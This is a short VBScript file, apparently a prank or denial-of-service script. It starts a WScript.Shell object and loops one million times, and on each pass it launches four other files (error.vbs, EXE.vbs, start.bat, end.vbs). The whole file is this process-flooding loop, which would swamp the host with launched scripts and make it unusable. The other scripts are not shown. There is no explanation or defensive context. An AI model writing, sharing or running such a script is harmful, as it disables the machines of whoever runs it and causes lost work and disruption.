dim count
set object = wscript.CreateObject("wscript.shell")

do
object.run "error.vbs"
object.run "EXE.vbs"
object.run "start.bat"
object.run "end.vbs"
count = count + 1
loop until count = 1000000
